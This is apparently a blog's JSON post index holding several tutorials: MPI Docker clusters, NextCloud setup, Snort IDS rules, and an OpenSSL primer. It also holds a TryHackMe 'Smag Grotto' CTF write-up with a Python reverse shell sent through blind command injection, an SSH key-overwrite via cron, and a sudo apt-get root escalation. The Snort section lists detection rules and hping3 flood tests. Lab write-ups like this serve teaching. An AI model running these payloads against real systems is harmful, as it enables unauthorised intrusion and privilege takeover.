network for the cluster setup to communicate Connecting master and workers to that virtual networkDockerfileThe following is the Dockerfile for the projectFROM nlknguyen/alpine-mpich:onbuild# # ------------------------------------------------------------# # Build MPI project# # ------------------------------------------------------------# Put all build steps and additional package installation here# Note: the current directory is ${WORKDIR:=/project}, which is# also the default directory where ${USER:=mpi} will SSH login to# Copy the content of `project` directory in the host machine to # the current working directory in this Docker imageCOPY project/ .# Normal build commandRUN mpicc -o mpi_hello_world mpi_hello_world.c# ##################### For Docker beginner:# After Docker syntax `RUN`, you can execute any command available in # the current shell of the image.# To switch to root: USER root# To switch back to default user: USER ${USER}The Dockerfile simply pulls the alpine-mpich image from DockerHub, copies the our source code from our local machine to the container and compiles it using mpicccluster.shThe cluster.sh file is basically a startup script provided to us so that we don‚Äôt have to go through the hassle of following up on the docker-compose command syntax. It also creates the SSH key-pair for the master containerBasic ArchitectureThe master gets a specific task and splits it into multiple tasks/divides a task into parts and divides the workload among n number of workers (in this case n=3)ConclusionEven though this tutorial is just a PoC and works on a single host while emulating a cluster, it gives us the fundamental understand of how a distributed computing setup is achieved. alpine-mpich also supports Multi-host Orchestration. Anyway, knowing how to setup a cluster is absolutely essential for every computer scientist out there as distributed computing helps save time and make the impossible possible!" }, { "title": "THM - Smag Grotto Writeup", "url": "/posts/THM-Smag-Grotto-Writeup/", "categories": "Writeups, TryHackMe", "tags": "ctf, tryhackme, pentesting, cyber security, penetration testing", "date": "2023-06-18 02:00:00 +0500", "snippet": " Room Name: Smag Grotto Difficulty: Easy Link: TryHackMeInitial Access My IP Address: 10.4.0.190 Machine IP Address: 10.10.58.112 The machine tagline seems like a hint: Follow the yellow bric...", "content": " Room Name: Smag Grotto Difficulty: Easy Link: TryHackMeInitial Access My IP Address: 10.4.0.190 Machine IP Address: 10.10.58.112 The machine tagline seems like a hint: Follow the yellow brick road.Port ScanFor my port scan, I like to run an all port scan with the verbose flag in nmap:‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Desktop/Ps]‚îî‚îÄ$ nmap -p- -T4 -vvv 10.10.58.112 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-18 08:04 EDTInitiating Ping Scan at 08:04Scanning 10.10.58.112 [2 ports]Completed Ping Scan at 08:04, 0.48s elapsed (1 total hosts)Initiating Parallel DNS resolution of 1 host. at 08:04Completed Parallel DNS resolution of 1 host. at 08:04, 6.51s elapsedDNS resolution of 1 IPs took 6.51s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 3, CN: 0]Initiating Connect Scan at 08:04Scanning 10.10.58.112 [65535 ports]Discovered open port 22/tcp on 10.10.58.112Discovered open port 80/tcp on 10.10.58.112Increasing send delay for 10.10.58.112 from 0 to 5 due to 35 out of 87 dropped probes since last increase.Connect Scan Timing: About 1.46% done; ETC: 08:40 (0:34:53 remaining)The reason behind this is because sometimes a machine uses out of the norm services which the default nmap scan misses (mostly). However, since the all port scan takes a lot of time, I use the ‚Äò-vvv‚Äô flag so I can run a separate aggressive scan on the initially discovered ports.‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Desktop/Ps]‚îî‚îÄ$ nmap -p 22,80 -A 10.10.58.112 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-18 08:07 EDTNmap scan report for 10.10.58.112Host is up (0.47s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 74e0e1b405856a15687e16daf2c76bee (RSA)| 256 bd4362b9a1865136f8c7dff90f638fa3 (ECDSA)|_ 256 f9e7da078f10af970b3287c932d71b76 (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: SmagService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 24.05 secondsWeb EnumerationSince I can see an HTTP server open on port 80, I immediately spin up a web browser to visit that website.This doesn‚Äôt seem helpful at all so I think of going through the following steps: Viewing Source Code Checking if there is a robots.txt file Directory EnumerationViewing Source CodeDead end :(Robots.txtNope :(Directory EnumerationWhen there‚Äôs no other option left, I tend to for directory enumeration. My favorite tool is feroxbuster as it is crazy fast and does recursive scanning.feroxbuster --url http://10.10.58.112 -t 20 -d 0 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txtAfter a few seconds, feroxbuster gives me a good looking directory mail.Mail DirectoryUpon visiting the /mail/ directory, I see a lot of juicy information. The first thought I have upon seeing these email addresses is that they could also be possible usernames so I keep them saved in a separate place.PCAP files are always interesting so I download it. However, before analyzing that in Wireshark, I open up the source code (just in case).Seeing that the PCAP file resides in a whole different subdirectory, I visit that subdirectory but it only contains this PCAP file. However, we discover another potential username commented out.The final username wordlist I create is:netadminuzitroddjakeNow, onto the PCAP file.Network Dump AnalysisThe network dump only contains a single HTTP POST request and its response. However, that single POST request contains a lot of important information.First of all, I discover a set of possible credentials for an admin panel:helpdesk:cH4nG3M3_n0wApart from that, I notice that this dump is not for the main website but for a subdomain. So, I add the following record to the /etc/hosts file:development.smag.thmVisiting the subdomain, I get the following directory listing:I visit the /login.php page and submit the form using the previously discovered credentials. To my surprise, the credentials work and I am redirected to the /admin.php page.ExploitationA web page that allows you to run commands? What could go wrong? I just know there is a command injection vulnerability on this page. However, entering any command doesn‚Äôt give any output. Maybe it‚Äôs blind command injection? With that mindset, I grab a python reverse shell payload from Revshells‚Ä¶python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.4.0.190\",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'‚Ä¶ and spin up a netcat listenernc -lvnp 9999Injecting this payload gives us a shell!User FlagAs the user www-data, I am able to navigate into the user jake‚Äôs home directory. However, I‚Äôm not allowed to read the user.txt file :(I try a couple a privilege escalation vectors and cronjobs are a hit.cat /etc/crontab# /etc/crontab: system-wide crontab# Unlike any other crontab you don't have to run the `crontab'# command to install the new version when you edit this file# and files in /etc/cron.d. These files also have username fields,# that none of the other crontabs do.SHELL=/bin/shPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin# m h dom mon dow user command17 * * * * root cd / &amp;&amp; run-parts --report /etc/cron.hourly25 6 * * * root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )52 6 1 * * root test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )* * * * * root /bin/cat /opt/.backups/jake_id_rsa.pub.backup &gt; /home/jake/.ssh/authorized_keysWhat‚Äôs happening here is that every minute, the user root copies an authorized public key from a backup to the user jake‚Äôs ssh folder. Now, all I need to do is create an ssh public key and overwrite the backup with my own public key.I generate a new ssh key pair using ssh-keygenAfter that, I copy the contents of the id_rsa.pub file created and overwrite the jake_id_rsa.pub.backup file with the copied contents.www-data@smag:/home/jake$ cd /opt/.backupscd /opt/.backupswww-data@smag:/opt/.backups$ ls -lals -latotal 12drwxr-xr-x 2 root root 4096 Jun 4 2020 .drwxr-xr-x 3 root root 4096 Jun 4 2020 ..-rw-rw-rw- 1 root root 563 Jun 5 2020 jake_id_rsa.pub.backupwww-data@smag:/opt/.backups$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDfUYOlivnuF9s8FG7Nsl9VjNz4BUriSnMDxZyjEu9nSlTlMbu82HlSpmLBf+YdnFIvEKtrAzylrRuZ97yWNvXZfPtMHES+/18T8h7ppLfaXMrvWPqixt1JpBJGyFkTfMf7nRtm34W6L0fDqzsFjGRJv0ZNaIOFt2W2Vt19V/4fwVjZHyGi8w4/XV8aUo11KIfpwY1Xmg3+Tccg7f9UqCa8tjFMH4eAZfCBYZy5fFy3R++JUAdolmlTzUKQapKD4HyB1g31EW5vcjo1MEL286+YwrHKcgs5g13f4VQOwUz30DDlLJQQtGEwOUB+F4FEq9XKp495Tc8TUc+GaXtyez0HWv/zUrB3UBadn8+f6n8bAK2vLMq/eAXn3MWp2+5hNnKk+eoPxxdKfdXck4mfUc5piwz2dd1p3V2OVjv6VPgP/IC7WNBUagBd+SUX3NJOj0K+ESCQq0/tBq+mXZzAuB90ZpZ2rgNhsGET2A3gWh6M61hmPVGecMGH0of/pLZBbXM= jake@smag.thm' &gt; jake_id_rsa.pub.backup&lt;GH0of/pLZBbXM= jake@smag.thm' &gt; jake_id_rsa.pub.backup www-data@smag:/opt/.backups$ cat jake_id_rsa.pub.backupcat jake_id_rsa.pub.backupssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDfUYOlivnuF9s8FG7Nsl9VjNz4BUriSnMDxZyjEu9nSlTlMbu82HlSpmLBf+YdnFIvEKtrAzylrRuZ97yWNvXZfPtMHES+/18T8h7ppLfaXMrvWPqixt1JpBJGyFkTfMf7nRtm34W6L0fDqzsFjGRJv0ZNaIOFt2W2Vt19V/4fwVjZHyGi8w4/XV8aUo11KIfpwY1Xmg3+Tccg7f9UqCa8tjFMH4eAZfCBYZy5fFy3R++JUAdolmlTzUKQapKD4HyB1g31EW5vcjo1MEL286+YwrHKcgs5g13f4VQOwUz30DDlLJQQtGEwOUB+F4FEq9XKp495Tc8TUc+GaXtyez0HWv/zUrB3UBadn8+f6n8bAK2vLMq/eAXn3MWp2+5hNnKk+eoPxxdKfdXck4mfUc5piwz2dd1p3V2OVjv6VPgP/IC7WNBUagBd+SUX3NJOj0K+ESCQq0/tBq+mXZzAuB90ZpZ2rgNhsGET2A3gWh6M61hmPVGecMGH0of/pLZBbXM= jake@smag.thmwww-data@smag:/opt/.backups$ Now, I can finally log in as the user jake using ssh:ssh jake@10.10.58.112 -i id_rsaAnd viola! I get the user flag!Root FlagFor horizontal privilege escalation, the first vector I tend to go about is looking for files I can run as a superuser using the command sudo -l. In this case, the user jake is able to run /usr/bin/apt-get is a super user without a password.jake@smag:~$ sudo -lMatching Defaults entries for jake on smag: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser jake may run the following commands on smag: (ALL : ALL) NOPASSWD: /usr/bin/apt-getAfter finding this information, I go to GTFOBins to check if the apt-get binary is a Get-the-f‚Äìk-out binary. Luckily, it is!GTFOBins gives me a working payload to get a privileged shell as the root user.sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/shNow, all I need to do is cat out the contents of the /root/root.txt file and this box is pwned!" }, { "title": "Build your Very Own Cloud Storage Right Now!", "url": "/posts/Built-Your-Very-Own-Cloud-Storage-Right-Now!/", "categories": "Blogs, Cloud Computing", "tags": "cloud computing, cloud, private cloud, IaaS, PaaS, cloud storage", "date": "2023-05-10 02:00:00 +0500", "snippet": "IntroductionWhen working in an organization or as a freelancer, one always faces an issue with file storage. There are millions of documents, images and important files that you need to store and a...", "content": "IntroductionWhen working in an organization or as a freelancer, one always faces an issue with file storage. There are millions of documents, images and important files that you need to store and access from multiple locations. You can always get yourself some space in Google Cloud, AWS or Azure. However, you can never be sure with senstitive files, especially if you‚Äôre working for a government (or military) organization. That‚Äôs where NextCloud comes in.NextCloud is a free and open-source software for creating your very own private cloud storage. It offers tonnes of features while being dedicated to you and your organization. We can set up NextCloud in any environment including Windows, Linux. It can even be set up on a cloud instance! For this assignment, I will be setting up NextCloud on an Ubuntu-based Compute Instance on Google Cloud Platform.Task 1. Setting up NextCloudPre-requisitesUpdate and upgrade your operating systemsudo apt-get update &amp;&amp; sudo apt-get upgradeInstall the dependencies needed to configure and run NextCloudsudo apt install apache2 mariadb-server libapache2-mod-php8.1sudo apt install php8.1-gd php8.1-mysql php8.1-curl php8.1-mbstring php8.1-intlsudo apt install php8.1-gmp php8.1-bcmath php-imagick php8.1-xml php8.1-zipSetting up backend databaseStart the MySQL server and log into the server console as the root usersudo systemctl start mysqlsudo mysql -u root -pCreate an admin user for your NextCloud server and grant it privileges for the ‚Äúnextcloud‚Äù database.* Change ‚Äúabdullahirfan2001‚Äù to your username and ‚Äúpassword‚Äù to your password.CREATE USER 'abdullahirfan2001'@'localhost' IDENTIFIED BY 'password';CREATE DATABASE IF NOT EXISTS nextcloud CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci;GRANT ALL PRIVILEGES ON nextcloud.* TO 'abdullahirfan2001'@'localhost';FLUSH PRIVILEGES;quit;Downloading and configuring NextCloudDownload NextCloud from the official server and unzip the downloaded archive.wget https://download.nextcloud.com/server/prereleases/nextcloud-25.0.0rc3.zipunzip nextcloud*Copy the unzipped folder to the /var/www/ directory so that we can configure it to run on our Apache server.sudo cp -r nextcloud /var/www/Open the Apache configuration file for NextCloud‚Ä¶sudo nano /etc/apache2/sites-available/nextcloud.conf‚Ä¶and add the following lines to itAlias /nextcloud \"/var/www//assets/NextCloud/\"&lt;Directory /var/www//assets/NextCloud/&gt; Require all granted AllowOverride All Options FollowSymLinks MultiViews &lt;IfModule mod_dav.c&gt; Dav off &lt;/IfModule&gt;&lt;/Directory&gt;Enable the nextcloud websitesudo a2ensite nextcloud.confEnable additional modules needed to run NextCloud without any errorssudo a2enmod rewritesudo a2enmod headerssudo a2enmod envsudo a2enmod dirsudo a2enmod mimeRestart the Apache server to make the changes effectivesudo systemctl restart apache2Enable SSL for secure communication to your cloud and reload the Apache serversudo a2enmod sslsudo a2ensite default-sslsudo service apache2 reloadGiving ownership of the NextCloud website to Apachesudo chown -R www-data:www-data /var/www//assets/NextCloud/Installation WizardNavigate to https://{PUBLIC_IP}//assets/NextCloud/ to access the installation wizard. For Database Name, put in nextcloud and for Database host, put in localhost:3306. Enter the username and password you previously set up in your database and you‚Äôre good to go.Congratulations, you have successfully set up your very own private cloud! Here is the screen you should now be able to see.Click on the folder-looking icon on the top to access your cloud storage.Adding FilesTo add a file to your very own cloud storage, click on the ‚Äú+‚Äù button‚Ä¶‚Ä¶and select the file you want to upload.Now, you will be able to see your uploaded file in the directory listing. Click on your file to view it.Task 2. Describe your cloud service model and deployment modelDeployment Model: Private CloudThis cloud is private since it is deployed on your own infrastructure and is only usable by people/organizations that you have authorized.Service Model: IaaS and PaaSThe general opinion about cloud storage is that it is IaaS (Infrastructure as a Service) because the users are being provided with storage infrastructure. However, NextCloud can be classified as PaaS (Platform as a Service) since it provides a complete platform with security, user management and division of storage. I would classify this service model as a hybrid of IaaS and PaaS.Task 3. Accessing NextCloud from a mobile deviceDownload the NextCloud client Android iOSEnter the URL i.e. https://{PUBLIC IP}//assets/NextCloud/ and click the arrow button.Grant access to your device to log into your NextCloud.Enter your login detailsFinally, grant access to the device for logging in with your account.Congratulations! You just accessed your very own private cloud from your mobile device.Task 4. Accessing NextCloud from the DesktopDownload the Desktop client for NextCloud and install it (a system reboot may be required).Press the login button and enter the URL of your NextCloud server.Since our SSL certificate is not registered with a valid Certificate Authority, we will get a prompt. Tick the box that says ‚ÄúTrust this certificate‚Ä¶‚Äù and proceed.This will take you to your web browser to ask you to grant access to the desktop client. Press the login button.Enter your login information to authorize the desktop client.Finally, click on ‚ÄúGrant Access‚Äù.Configure the synchronization settings for your private cloud with your desktop and proceed.Navigate to the NextCloud directory in your file explorer and you will be able to see the file you previously uploaded to your private cloud.Now, you can start adding users and expand your cloud!ConclusionNextCloud is probably one of the best choices for setting up private cloud storage for your organization and even personal use. It provides built-in features such as identity and access management, data seperation and more. Keep all your important data stored on a central server and access it anywhere in the world, on any device." }, { "title": "Snort for Dummies!", "url": "/posts/Snort-for-Dummies/", "categories": "Blogs, Network Security", "tags": "network security, intrusion detection, idps, ids, insider threats, attacks, cyber defense, for dummies", "date": "2023-04-16 03:43:00 +0500", "snippet": "What is Snort?Snort is one of the most popular open-source Intrusion Detection Systems (IDS). Snort is helpful in generating alerts based on the kind of traffic you declare unwanted for your networ...", "content": "What is Snort?Snort is one of the most popular open-source Intrusion Detection Systems (IDS). Snort is helpful in generating alerts based on the kind of traffic you declare unwanted for your network/host. IDS have become a vital component of network security. However, most people tend to avoid it due to complications in the configuration process. Today, I am going to try and help you install and configure Snort in the easiest way possible.InstallationInstalling dependenciesBefore actually installing Snort, there are a couple of pre-requisite services that we need to install in order to configure and use Snort properly. Install the basic dependencies for Snort sudo apt install build-essential libpcap-dev libpcre3-dev libnet1-dev zlib1g-dev luajit hwloclibdumbnet-dev bison flex liblzma-dev openssl libssl-dev pkg-config libhwloc-dev cmake cpputest libsqlite3-dev uuid-dev libcmocka-dev libnetfilter-queue-dev libmnl-dev autotools-dev libluajit-5.1-dev libunwind-dev libfl-dev -y Create a new directory for Snort installation files mkdir install_snort &amp;&amp; cd install_snort Install LibDAQ (Data Acquisition Module) git clone https://github.com/snort3/libdaq.gitcd libdaq./bootstrap./configuremake &amp;&amp; sudo make installcd .. Install TCMalloc for better concurrency and performance (optional but highly recommended for production environments) wget https://github.com/gperftools/gperftools/releases/download/gperftools-2.9.1/gperftools-2.9.1.tar.gztar xzf gperftools-2.9.1.tar.gzcd gperftools-2.9.1/./configuremake &amp;&amp; sudo make installcd .. Installing Snort Download Snort source code and building it according to your configurations. (Please note that the ‚Äîenable-tcmallocflag can be omitted if you prefer not to use TCMalloc) wget https://github.com/snort3/snort3/archive/refs/heads/master.zipunzip master.zipcd snort3-master./configure_cmake.sh --prefix=/usr/local --enable-tcmalloc Install the build cd buildmake &amp;&amp; sudo make install Update shared libraries to avoid any errors while trying to run Snort sudo ldconfig Test the installation by running snort -V. Incase of successful installation, you will be able to see similar output to the following:```bash ,,_ -*&gt; Snort++ &lt;*-o\" )~ Version 3.1.58.0 '''' By Martin Roesch &amp; The Snort Team http://snort.org/contact#team Copyright (C) 2014-2023 Cisco and/or its affiliates. All rights reserved. Copyright (C) 1998-2013 Sourcefire, Inc., et al. Using DAQ version 3.0.11 Using LuaJIT version 2.1.0-beta3 Using OpenSSL 3.0.8 7 Feb 2023 Using libpcap version 1.10.3 (with TPACKET_V3) Using PCRE version 8.39 2016-06-14 Using ZLIB version 1.2.13 Using LZMA version 5.4.1 * To test the default configuration file against Snort, run snort -c /usr/local/etc/snort/snort.lua and you will get the following result on success:```bash ... ... ... Snort successfully validated the configuration (with 0 warnings). o\")~ Snort exitingCongratulations! You just successfully installed Snort.ConfigurationConfiguring network interfacesTo allow Snort to sniff and filter out network traffic, we need to put our network interface into promiscuous mode. First, we need to figure out which interface we want to listen on. To list out all network interfaces, we can use the ip add command. 1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000 link/ether 08:00:27:0e:34:8d brd ff:ff:ff:ff:ff:ff inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0 valid_lft 85903sec preferred_lft 85903sec inet6 fe80::a00:27ff:fe0e:348d/64 scope link noprefixroute valid_lft forever preferred_lft forever We will be using the eth0 interface. Then, we set the interface to promiscuous mode sudo ip link set dev eth0 promisc on We also need to ensure that Generic Offloading (GRO) is turned off. To do that, we can use the following command: ethtool -k eth0 | grep receive-offload In case it is turned on like this‚Ä¶ generic-receive-offload: onlarge-receive-offload: off [fixed] ‚Ä¶ we need to turn it off sudo ethtool -K eth0 gro off lro off Finally, we need to create a service to ensure our configuration is persistent across reboots. Create a service file for Snort sudo nano /etc/systemd/system/snort3-nic.service Add the following lines to the file and save it```bash[Unit]Description=Set Snort 3 NIC in promiscuous mode and Disable GRO, LRO onbootAfter=network.target[Service]Type=oneshotExecStart=/usr/sbin/ip link set dev eth0 promisc onExecStart=/usr/sbin/ethtool -K eth0 gro off lro offTimeoutStartSec=0RemainAfterExit=yes[Install]WantedBy=default.target* Reload the system daemon```bash sudo systemctl daemon-reload Finally, enable the Snort service sudo systemctl enable --now snort3-nic.service Check the status of the service $ service snort3-nic status‚óè snort3-nic.service - Set Snort 3 NIC in promiscuous mode and DisableGRO, LRO on boot Loaded: loaded (/etc/systemd/system/snort3-nic.service; enabled;preset: disabled) Active: active (exited) since Sun 2023-03-26 06:45:43 EDT; 30s ago Process: 3143 ExecStart=/usr/sbin/ip link set dev eth0 promisc on(code=exited, status=0/SUCCESS) Process: 3144 ExecStart=/usr/sbin/ethtool -K eth0 gro off lro off(code=exited, status=0/SUCCESS) Main PID: 3144 (code=exited, status=0/SUCCESS) CPU: 7ms Configuring Rules To make sure the rule creation and filtering process goes smoothly, we need to create a few necessary directories and files for our rules and logs.sudo sumkdir -p {/usr/local/etc/rules,/usr/local/etc/so_rules/,/usr/local/etc/lists/,/var/log/snort}touch /usr/local/etc/rules/local.rules /usr/local/etc/lists/default.blocklistexitThen we need to add the rules to the /usr/local/etc/rules/local.rules as follows: Detecting DoS/DDoS attack on your web server alert tcp any any -&gt; 192.168.1.42 80 (flags:S; detection_filter: track by_src, count 100, seconds 10; msg:\"Possible SYN Flood Attack\"; sid:1000001;) Detecting SQL Injection attack on your web server alert tcp any any -&gt; 192.168.1.42 80 (msg:\"Possible SQL injection attack detected\"; flow:to_server,established; content: \"%27\" ; sid:100002; rev:1;) Detecting Port Scanning activity alert tcp any any -&gt; any any (msg:\"Port scanning detected\"; flags:S; detection_filter:track by_src, count 3, seconds 10; sid:100003; rev:1;) Detecting Network Interception attempts alert ip any any -&gt; any any (msg:\"Possible network interception detected\"; fragbits: M; sid:100004; rev:1;) Detecting Password/Login bruteforcing alert tcp any any -&gt; 192.168.1.42 80 (msg:\"Password/login attempt detected\"; content:\"POST\"; content:\"username\"; content:\"password\"; sid:100005; rev:1;) Detecting basic WiFi attack (DHCP Fingerprinting) alert udp any any -&gt; any 67 (msg:\"Possible DHCP fingerprinting detected\"; content:\"|01 01 06|\"; sid:10006;) Detecting Custom Packet Generation on network alert tcp any any -&gt; any any (msg:\"Possible crafted TCP packet detected\"; flags: AP; dsize: 0; sid:10007; rev:1;) Finally, we can test these rules against Snort snort -c /usr/local/etc/snort/snort.lua -R /usr/local/etc/rules/local.rules To allow Snort to run according to these rules by default, go to line 182 of your /usr/local/etc/snort/snort.lua file and ensure the ips section to be as follows:```luaips ={ ‚Äì use this to enable decoder and inspector alerts enable_builtin_rules = true,include = RULE_PATH .. ‚Äú/local.rules‚Äù,‚Äì use include for rules files; be sure to set your path ‚Äì note that rules files can include other rules files ‚Äì (see also related path vars at the top of snort_defaults.lua)variables = default_variable}Verify the configuration```bashsnort -c /usr/local/etc/snort/snort.luaConfiguring LogsThere are a lot of options when it comes to the way you want Snort to log your events and errors. However, we will be using the alert_fast option to prevent noisy logs.To do this, we can go to the output section of the /usr/local/etc/snort/snort.lua file and modify it so it looks like this---------------------------------------------------------------------------- 7. configure outputs-------------------------------------------------------------------------- -- event logging-- you can enable with defaults from the command line with -A &lt;alert_type&gt;-- uncomment below to set non-default configsalert_csv = { }alert_fast = {file=true, packet=false, limit=10,}alert_full = { }alert_sfsocket = { }alert_syslog = { }unified2 = { } -- packet logging-- you can enable with defaults from the command line with -L &lt;log_type&gt;log_codecs = { }log_hext = { }log_pcap = { }-- additional logspacket_capture = { }file_log = { }Finally, test the configurationsnort -c /usr/local/etc/snort/snort.luaConfiguring Snort to run as a serviceIn production environments, it is recommended to run Snort as a daemon instead of running it on the console. To run it as a daemon, we need to configure some settings.First, we need to create a non-privileged and non-logon user for the Snort daemonuseradd -r -s /usr/sbin/nologin -M -c SNORT_IDS snortThen, we need to grant Snort the rights to its logging directory.sudo chmod -R 5775 /var/log/snortsudo chown -R snort:snort /var/log/snortWe need to create a service file for snortsudo nano /etc/systemd/system/snort3.serviceand add the following lines to it[Unit]Description=Snort3 NIDS DaemonAfter=syslog.target network.target[Service]Type=simpleExecStart=/usr/local/bin/snort -c /usr/local/etc/snort/snort.lua -s65535 -k none -l /var/log/snort -D -u snort -g snort -i eth0 -m 0x1b--create-pidfileExecStop=/bin/kill -9 $MAINPID[Install]WantedBy=multi-user.targetFinally, we need to enable and start the Snort servicesudo systemctl enable snort3sudo service snort3 startWe can check the status of the Snort daemon as follows:$ sudo service snort3 status‚óè snort3.service - Snort3 NIDS Daemon Loaded: loaded (/etc/systemd/system/snort3.service; enabled;preset: disabled) Active: active (running) since Sun 2023-03-26 07:42:17 EDT; 3s ago Main PID: 4810 (snort) Tasks: 2 (limit: 9440) Memory: 61.9M CPU: 259ms CGroup: /system.slice/snort3.service ‚îî‚îÄ4810 /usr/local/bin/snort -c /usr/local/etc/snort/snortlua -s 65535 -k none -l /var/log/snort -D -u &gt; Mar 26 07:42:17 kali systemd[1]: Started snort3.service - Snort3 NIDS Daemon.Great! Now that we have Snort up and running, we can start testing the rules we made.Testing our Rules (Optional but Recommended)Testing your rules is a must before adding them to your IDS in a production environment. This helps ensure that the rules are properly tuned and have no negative affect.We can look at alerts generated by Snort (in real-time) with the following command:tail -f /var/log/snort/alert_fast.txtHere are the IP addresses assigned to my machines (for your reference):192.168.1.22 #attacker machine192.168.1.42 #victim/web serverRule#1:Detecting a SYN Flood (DoS/DDoS) attack:alert tcp any any -&gt; 192.168.1.42 80 (flags:S; detection_filter: track by_src, count 100, seconds 10; msg:\"Possible SYN Flood Attack\"; sid:1000001;)To test this rule, we can use a simple hping3 command:sudo hping3 --flood -S -p 80 192.168.1.42 This will generate the following alerts:Testing DoS/DDoS RuleRule#2:Detecting an injection attack on your web server:alert tcp any any -&gt; 192.168.1.42 80 (msg:\"Possible SQL injection attack detected\"; flow:to_server,established; content: \"%27\" ; sid:100002; rev:1;)First, we need to create a test website and host it on an apache server. We can do this by creating a file called index.php in the /var/www/html/ directory and adding the following contents to it:&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Test Page&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form action=\"\" method=\"GET\"&gt; &lt;input type=\"text\" name=\"id\"&gt; &lt;input type=\"submit\" value=\"Submit\"&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;We can then start our apache server with the following command:sudo systemctl restart apache2To test this rule, we can use the curl command:curl \"http://192.168.1.42/index.php?id=%27OR\" -vThis will generate the following alert:Testing SQL Injection RuleRule#3:Detecting port scanning activity on your network:alert tcp any any -&gt; any any (msg:\"Port scanning detected\"; flags:S; detection_filter:track by_src, count 3, seconds 10; sid:100003; rev:1;)Since this rule only detects SYN scans, we can use the following nmap command to test it:sudo nmap -sS 192.168.1.42This will generate the following alert:Testing SYN Scanning RuleRule#4:Detecting network interception attempts:alert ip any any -&gt; any any (msg:\"Possible network interception detected\"; fragbits: M; sid:100004; rev:1;)We can use the following hping3 command to generate fragmented packets:sudo hping3 192.168.1.42 -c 5 -d 1500 -F -f This will generate the following output:Testing Network Interception RuleRule#5:Detecting login attempts on your web server:alert tcp any any -&gt; 192.168.1.42 80 (msg:\"Password/login attempt detected\"; content:\"POST\"; content:\"username\"; content:\"password\"; sid:100005; rev:1;)To test this rule, we first need to create an api endpoint login.php in our /var/www/html directory. We can use the following test endpoint:&lt;?phpsession_start();$username = $_POST['username'];$password = $_POST['password'];if ($username === 'admin' &amp;&amp; $password === 'password123') { $_SESSION['user'] = 'admin'; header('Location: /dashboard.php'); exit();} else { echo 'Invalid username or password.';}?&gt;We can restart our Apache server with the following command:sudo systemctl restart apache2To test this rule, we can use the curl command:curl -d \"username=test&amp;password=invalid\" -X POST http://192.168.1.42/login.phpThis will generate the following alert:Testing Login attempt RuleRule#6:Detecting DHCP Fingerprinting:alert udp any any -&gt; any 67 (msg:\"Possible DHCP fingerprinting detected\"; content:\"|01 01 06|\"; sid:10006;)To test this rule, we can create a file called dhcp_packet.raw and add the contents 01 01 06 to it. Then we can use the following hping3 command to send a DHCP request to the victim server:sudo hping3 -2 -c 1 -p 67 -s 68 -d '010106' -E dhcp_packet.raw 192.168.1.42This will generate the following alert:Testing DHCP Fingerprinting RuleRule#7:Detecting crafted packet in network:alert tcp any any -&gt; any any (msg:\"Possible crafted TCP packet detected\"; flags: AP; dsize: 0; sid:10007; rev:1;)This this specific rule tests for a crafted packet with the ACK and PSH flags set, we can use the following hping3 command to test it:sudo hping3 -c 1 -A -P -p 80 --data 0 192.168.1.42 This will generate the following alert:Testing Crafted TCP packet ruleConclusionSnort is an extremely powerful, open-source solution for intrusion detection. They say ‚Äúwhen life gives you lemons, make lemonade‚Äù. How this saying relates to our topic is that no matter how tedious it might seem to configure Snort, it will help protect your organization from thousands of attacks if you tune and monitor it properly." }, { "title": "OpenSSL for Dummies!", "url": "/posts/OpenSSL-for-Dummies/", "categories": "Blogs, Network Security", "tags": "network security, openssl, ssl, encryption, decryption, secure communication, cryptography, for dummies", "date": "2023-04-16 02:00:00 +0500", "snippet": "What is OpenSSL?OpenSSL is an open-source tool for cryptography- mainly SSL and TLS. It is a powerful tool when and supports all kinds of functionalities- from key generation to client/server tests...", "content": "What is OpenSSL?OpenSSL is an open-source tool for cryptography- mainly SSL and TLS. It is a powerful tool when and supports all kinds of functionalities- from key generation to client/server tests.Use CasesThe wide range of use cases that OpenSSL covers is too wide to list here. But here are some of the top use cases.**Assymetric key-pair generationAssymetric encryption is an important part of today‚Äôs IT infrastructure, including websites. OpenSSL supports many public key encryption algorithms. I will be covering RSA and Eliptic Curves.RSAGenerating an RSA private key:openssl genpkey -algorithm RSA -out RSApriv.pemGenerating an RSA public 